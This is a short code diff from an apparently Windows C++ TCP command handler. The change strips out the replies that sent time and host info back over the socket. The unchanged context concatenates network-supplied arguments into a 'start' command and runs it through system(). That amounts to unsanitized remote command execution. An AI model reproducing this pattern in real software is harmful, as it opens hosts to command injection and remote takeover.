@@ -75,15 +75,9 @@ int TcpMain(SOCKET sock) {
                 std::string syscmd = "start " + args[0].append(" "+args[1].append(" "+args[2].append(" "+args[3].append(" "+args[4]))));
                 system(syscmd.c_str());
             } else if(cmd == "time") {
-                char t[SEND_MAX];
-                memset(t, 0, sizeof(t));
-                strcpy(t, sys.GetTime().c_str());
-                send(sock, t, SEND_MAX, 0);
+                sys.GetTime();
             } else if(cmd == "info"||cmd == "ver") {
-                char msg[SEND_MAX];
-                memset(msg, 0, sizeof(msg));
-                strcpy(msg, sys.GetHostInfo().c_str());
-                send(sock, msg, SEND_MAX, 0);
+                sys.GetHostInfo();
             } else {
                 char msg[SEND_MAX] = "\033[31mUnknown command!\033[39m\a\r\n";
                 std::cout << "ErrCommand: " << recvData + 1 << std::endl;
